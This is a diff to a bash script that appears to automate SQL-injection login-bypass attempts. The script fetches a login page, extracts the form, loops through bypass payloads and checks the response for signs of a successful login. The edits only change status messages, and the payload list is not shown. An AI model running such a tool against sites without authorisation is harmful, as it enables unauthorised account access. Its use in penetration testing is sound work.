@@ -131,10 +131,7 @@ curl_request() {
 test_login_sqli() {
     local base_url="$1"
     
-
-
-    echo "SQL Injecting Login Page: $base_url"
-    
+   
     # Step 1: Fetch the login page
     #echo "[*] Fetching login page..."
     response=$(curl_request "$base_url" "GET" "" 0)
@@ -144,12 +141,12 @@ test_login_sqli() {
     
     # Check if it's a login page
     if ! is_login_page "$html"; then
-        echo "[-] Not a login page"
+       # echo "[-] Not a login page"
         return 1
     fi
     
-    #echo "[+] Login page detected"
-    
+    echo "[+] Login page detected"
+    echo "Attempting to SQL Inject Login Page"
     # Step 2: Extract form details
     form_details=$(extract_login_form "$html")
     action_url=$(echo "$form_details" | cut -d'|' -f1)
@@ -197,7 +194,6 @@ test_login_sqli() {
     echo "$normal_html" > /tmp/original_login.txt
     
     # Step 4: Test SQL injection login
-    echo "[*] Testing SQL injection login..."
     
     # Common SQL injection payloads for login bypass
     payloads=(
@@ -236,8 +232,7 @@ test_login_sqli() {
         if [ "$sqli_http_code" -eq 200 ]; then
             # Check for success indicators
             if echo "$sqli_html" | grep -iq "welcome\|logout\|my account\|dashboard\|success\|logged in"; then
-                echo -e "${YELLOW}    ⚠️ SUCCESS! Login bypass with: $payload${NC}"
-                echo "    Final URL: $sqli_final_url"
+
                 vulnerable=1
                 break
             fi
